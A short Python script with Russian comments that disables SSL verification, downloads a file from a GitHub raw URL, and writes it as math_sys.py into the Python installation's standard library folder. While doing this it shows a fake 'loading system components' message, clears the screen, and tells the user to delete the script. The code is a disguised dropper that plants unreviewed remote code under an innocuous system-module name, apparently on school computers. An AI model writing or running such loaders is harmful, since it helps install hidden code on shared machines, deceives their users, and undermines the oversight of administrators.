import urllib.request as r
import os
import sys
import ssl

# Прямая RAW ссылка на твое ядро
URL = "https://raw.githubusercontent.com/deniska12022/math_sys.py/refs/heads/main/math_sys.py"

def inject():
    # Игнорим SSL для работы в школьных сетях
    ctx = ssl._create_unverified_context()
    # Путь в системные либы Python
    target = os.path.join(sys.prefix, 'Lib', 'math_sys.py')

    try:
        print("[...] Загрузка системных компонентов...")
        with r.urlopen(URL, context=ctx) as response:
            with open(target, 'wb') as f:
                f.write(response.read())

        # Очистка консоли после успеха
        os.system('cls' if os.name == 'nt' else 'clear')
        print("----------------------------------------")
        print("  SYSTEM READY. DELETE THIS SCRIPT.  ")
        print("----------------------------------------")
    except Exception as e:
        print(f"\n[!] Ошибка: {e}")

if __name__ == "__main__":
    inject()